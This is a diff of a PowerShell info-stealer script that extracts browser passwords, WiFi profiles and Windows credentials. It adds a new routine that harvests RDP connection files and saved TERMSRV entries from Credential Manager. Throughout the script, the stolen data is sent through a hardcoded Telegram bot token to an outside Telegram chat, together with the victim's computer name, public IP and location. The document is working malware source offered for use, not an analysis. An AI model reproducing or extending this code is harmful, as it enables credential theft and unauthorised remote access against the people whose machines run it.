@@ -1,5 +1,5 @@
-# Enhanced Multi-Browser and Network Password Extraction
-# Removed CSV generation, added network password extraction, improved file naming and cleanup
+# Enhanced Multi-Browser and Network Password Extraction with Improved RDP Credential Extraction
+# Removed CSV generation, added proper RDP credential extraction, improved file naming and cleanup
 
 param(
     [string]$TelegramBotToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
@@ -153,6 +153,72 @@ function Get-DetailedWiFiInfo {
     }
 }
 
+# Function to extract RDP connection information
+function Get-RDPConnections {
+    Write-Host "Extracting RDP connection information..." -ForegroundColor Yellow
+    
+    $rdpConnections = @()
+    
+    try {
+        # Get RDP connection files from Documents
+        $rdpFiles = Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.rdp" -ErrorAction SilentlyContinue
+        $rdpFiles += Get-ChildItem -Path "$env:USERPROFILE\Desktop" -Filter "*.rdp" -ErrorAction SilentlyContinue
+        
+        foreach ($rdpFile in $rdpFiles) {
+            try {
+                $content = Get-Content $rdpFile.FullName -ErrorAction Stop
+                $server = ($content | Where-Object { $_ -match "full address:s:" }) -replace "full address:s:", ""
+                $username = ($content | Where-Object { $_ -match "username:s:" }) -replace "username:s:", ""
+                
+                $rdpConnections += @{
+                    FileName = $rdpFile.Name
+                    Server = $server.Trim()
+                    UsernameHint = $username.Trim()
+                    FilePath = $rdpFile.FullName
+                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                }
+            } catch {
+                Write-Host "Error reading RDP file $($rdpFile.Name): $($_.Exception.Message)" -ForegroundColor Red
+            }
+        }
+        
+        # Check for saved credentials in Credential Manager
+        try {
+            $cmdkeyList = cmdkey /list 2>$null
+            $currentTarget = ""
+            
+            foreach ($line in $cmdkeyList) {
+                if ($line -match "Target:\s*(.+)") {
+                    $currentTarget = $matches[1].Trim()
+                } elseif ($currentTarget -and $line -match "Type:\s*(.+)") {
+                    $type = $matches[1].Trim()
+                    
+                    # Check if this is an RDP credential
+                    if ($currentTarget -like "TERMSRV/*" -or $currentTarget -like "MicrosoftAccount:target=TERMSRV/*") {
+                        $rdpConnections += @{
+                            FileName = "Credential Manager"
+                            Server = $currentTarget -replace "TERMSRV/", ""
+                            UsernameHint = "Saved in Credential Manager"
+                            Type = $type
+                            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                        }
+                    }
+                    $currentTarget = ""
+                }
+            }
+        } catch {
+            Write-Host "Error checking Credential Manager: $($_.Exception.Message)" -ForegroundColor Red
+        }
+        
+        Write-Host "Extracted $($rdpConnections.Count) RDP connections" -ForegroundColor Green
+        return $rdpConnections
+        
+    } catch {
+        Write-Host "Error extracting RDP connections: $($_.Exception.Message)" -ForegroundColor Red
+        return @()
+    }
+}
+
 # Function to extract Windows network credentials (RDP, VPN, etc.)
 function Get-WindowsNetworkCredentials {
     Write-Host "Extracting Windows network credentials..." -ForegroundColor Yellow
@@ -169,11 +235,16 @@ function Get-WindowsNetworkCredentials {
                 $currentTarget = $matches[1].Trim()
             } elseif ($currentTarget -and $line -match "Type:\s*(.+)") {
                 $type = $matches[1].Trim()
-                $networkCredentials += @{
-                    Target = $currentTarget
-                    Type = $type
-                    CredentialType = "RDP/Windows"
-                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                
+                # Only include RDP/network related credentials
+                if ($currentTarget -like "TERMSRV/*" -or $currentTarget -like "MicrosoftAccount:target=TERMSRV/*" -or 
+                    $currentTarget -like "Domain:target=*" -or $currentTarget -like "LegacyGeneric:target=*") {
+                    $networkCredentials += @{
+                        Target = $currentTarget
+                        Type = $type
+                        CredentialType = "RDP/Windows"
+                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    }
                 }
                 $currentTarget = ""
             }
@@ -616,6 +687,10 @@ Send-TelegramMessage -Message $systemMessage | Out-Null
 Write-Host "Extracting detailed WiFi information..." -ForegroundColor Yellow
 $wifiData = Get-DetailedWiFiInfo
 
+# Extract RDP connections
+Write-Host "Extracting RDP connections..." -ForegroundColor Yellow
+$rdpConnections = Get-RDPConnections
+
 # Extract Windows network credentials
 Write-Host "Extracting Windows network credentials..." -ForegroundColor Yellow
 $networkCredentials = Get-WindowsNetworkCredentials
@@ -623,6 +698,7 @@ $networkCredentials = Get-WindowsNetworkCredentials
 # Combine all network data
 $networkData = @{
     WiFi = $wifiData
+    RDPConnections = $rdpConnections
     WindowsCredentials = $networkCredentials
     Metadata = @{
         ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
@@ -678,7 +754,7 @@ foreach ($browserKey in $browsers.Keys) {
 }
 
 # Display and export results
-if ($allSummaryData.Count -gt 0 -or $wifiData.Profiles.Count -gt 0 -or $networkCredentials.Count -gt 0) {
+if ($allSummaryData.Count -gt 0 -or $wifiData.Profiles.Count -gt 0 -or $networkCredentials.Count -gt 0 -or $rdpConnections.Count -gt 0) {
     Write-Host "`nSuccessfully extracted data!" -ForegroundColor Green
     
     if ($allSummaryData.Count -gt 0) {
@@ -723,6 +799,10 @@ if ($allSummaryData.Count -gt 0 -or $wifiData.Profiles.Count -gt 0 -or $networkC
         Write-Host "Windows network credentials: $($networkCredentials.Count) entries found" -ForegroundColor Green
     }
     
+    if ($rdpConnections.Count -gt 0) {
+        Write-Host "RDP connections: $($rdpConnections.Count) entries found" -ForegroundColor Green
+    }
+    
     # Wait to ensure files are fully written
     Write-Host "Waiting for files to be fully written..." -ForegroundColor Yellow
     Start-Sleep -Seconds 5
@@ -740,9 +820,9 @@ if ($allSummaryData.Count -gt 0 -or $wifiData.Profiles.Count -gt 0 -or $networkC
         if (Send-TelegramFile -FilePath $BrowserJSONPath -Caption $browserCaption) { $filesSent++ }
     }
     
-    if ($wifiData.Profiles.Count -gt 0 -or $networkCredentials.Count -gt 0) {
+    if ($wifiData.Profiles.Count -gt 0 -or $networkCredentials.Count -gt 0 -or $rdpConnections.Count -gt 0) {
         $totalFiles += 1
-        $networkCaption = "📶 Network Credentials - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nWiFi Networks: $($wifiData.Profiles.Count)`nWindows Credentials: $($networkCredentials.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        $networkCaption = "📶 Network Credentials - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nWiFi Networks: $($wifiData.Profiles.Count)`nWindows Credentials: $($networkCredentials.Count)`nRDP Connections: $($rdpConnections.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
         
         if (Send-TelegramFile -FilePath $NetworkJSONPath -Caption $networkCaption) { $filesSent++ }
     }
@@ -756,6 +836,7 @@ if ($allSummaryData.Count -gt 0 -or $wifiData.Profiles.Count -gt 0 -or $networkC
 📊 <b>Browser Entries:</b> $($allSummaryData.Count)
 📶 <b>WiFi Networks:</b> $($wifiData.Profiles.Count)
 🔐 <b>Windows Credentials:</b> $($networkCredentials.Count)
+🖥️ <b>RDP Connections:</b> $($rdpConnections.Count)
 📁 <b>Files Sent:</b> $filesSent/$totalFiles
 ⏰ <b>Completed:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
 "@
